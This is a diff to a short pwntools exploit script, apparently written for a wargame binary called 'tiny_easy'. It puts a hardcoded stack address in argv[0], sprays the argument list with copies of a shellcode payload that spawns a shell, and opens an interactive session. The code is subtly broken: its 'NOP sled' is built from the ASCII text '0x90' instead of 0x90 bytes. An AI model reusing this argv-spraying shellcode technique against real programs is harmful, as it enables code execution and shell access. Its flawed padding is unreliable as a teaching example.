@@ -4,16 +4,16 @@ from pwn import *
 binary_path = './tiny_easy'
 
 # Define the custom argv array
-argv = [b'\xbc\xcf\xc7\xff']
+args = [p32(0xFFFFD050)]
 padding = b'0x90' * 10000
 
 paylod = padding + asm(shellcraft.sh())
 
 for _ in range(20):
-    argv.append(paylod)
+        args.append(paylod)
 
 # Start the process with the modified argv
-p = process(executable=binary_path, argv=argv)
+p = process(executable=binary_path, argv=args)
 p.interactive()
 #response = p.recv()
 #print(response)
